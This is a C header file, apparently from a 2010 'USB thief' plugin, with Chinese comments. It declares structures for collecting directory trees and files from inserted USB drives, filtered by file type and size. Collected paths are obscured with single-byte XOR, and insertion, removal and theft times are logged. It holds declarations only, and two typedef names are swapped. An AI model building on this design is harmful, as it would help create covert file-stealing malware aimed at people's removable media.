/*++ Build Version 0.9

Module Name:

	T5UsbConfig.h

Abstract:

	数据结构，函数声明什么的

UpdateTime:
	
	24 - 07 - 2010

Revision History:

	0.6 Release 13 - 07 - 2010
	0.7 Release 21 - 07 - 2010
	0.8 Release 23 - 07 - 2010
	0.9 Release 24 - 07 - 2010

--*/

#ifndef _TJ_T5_ZY_USBCONFIG_H
#define _TJ_T5_ZY_USBCONFIG_H

// 
//	USB 存储的文件类型
#define USB_MAGIC			0x00757342
#define USB_THIEF_VERSION	0x00000009
#define USB_FILE_FILE		0x00000020
#define USB_FILE_DIR		0x00000010
#define USB_FILE_STL		0x00000030
#define	USB_FILE_RTB		0x00000040
#define USB_FILE_USB		0x00000050

//
//	加密类型
#define USB_CRYPT_XOR		0x80000001		//加密种类，异或

//
//	异或的KEY
#define USB_CRYPT_XOR_KEY	'A'

//
//	目录日志文件的结构 :	1. 公用头	USB_COMMON_HEADER
//							2. U盘信息	FLASH_DISK_INFO
//							3. 目录数据	USB_DIR
//

#pragma pack( push )
#pragma pack(1)
//
//	u盘配置文件
typedef struct _USB_THIEF_CONFIG
{
	DWORD	dwSize;					//结构大小		
	BOOL	bGetFile;				//是否获取目录
	BOOL	bGetDir;				//是否取文件
	DWORD	dwFilterSize;			//最大获取文件大小
	DWORD	dwSizeOfType;			//获取文件类型字符串的大小
	WCHAR	wzFilterType[1];		//获取的文件类型，格式为: *.ppt;

}USB_THIEF_CONFIG, *PUSB_THIEF_CONFIG;

//
//	公用头
typedef struct _USB_COMMON_HEADER
{
	DWORD	dwSize;
	DWORD	dwPluginId;
	DWORD	dwPluginVersion;
	DWORD	dwMagic;
	DWORD	dwFileType;			// 文件类型
} USB_COMMON_HEADER, *PUSB_COMMON_HEADER;

//
//	U盘信息
typedef struct _FLASH_DISK_INFO
{
	DWORD	dwSize;
	WCHAR	wzVolume[MAX_PATH];
	WCHAR	wzFileSystem[32];
	DWORD	dwFlashDiskId;

	FILETIME	ftInsertTime;
	FILETIME	ftRemoveTime;
}FLASH_DISK_INFO_MAC, *PFLASH_DISK_INFO_MAC;

typedef struct _FLASH_DISK_INFO_MAC
{
	DWORD	dwSize;
	WCHAR	wzVolume[8];
	WCHAR	wzFileSystem[32];
	DWORD	dwFlashDiskId;

	FILETIME	ftInsertTime;
	FILETIME	ftRemoveTime;
}FLASH_DISK_INFO, *PFLASH_DISK_INFO;

//
//	U盘目录文件结构
typedef	struct	_USB_DIR
{
	DWORD	dwLevel;			//	目录层数

	DWORD	dwBasedDirPathLen;	//	基本目录长度
	PBYTE   lpBasedDirPath;		//	基本目录

	DWORD	dwDirDataLen;		//	该目录中数据的长度
	PBYTE	lpbyDirData;		//	该目录中的数据

	struct _USB_DIR *lpNext;
}USB_DIR, *PUSB_DIR;

//
//	文件数据
typedef	struct	_USB_FILE_DATA
{
	DWORD		dwSize;				//	结构大小

	CHAR		szKey;				//	异或
	DWORD		dwEncrytType;		//	加密种类

	//
	//	文件创建、访问、最后一次读写、取文件的时间
	FILETIME	ftCreation;			
	FILETIME	ftAccess;
	FILETIME	ftLastWrite;
	FILETIME	ftThief;

	DWORD		dwSizeOfFile;		//	文件大小
	DWORD		dwSizeOfFilePath;	//	U盘文件路径大小
	WCHAR		wzUsbFilePath[1];	//	U盘文件路径，需要异或
    		
}USB_FILE_DATA, *PUSB_FILE_DATA;

#pragma pack( pop )

#endif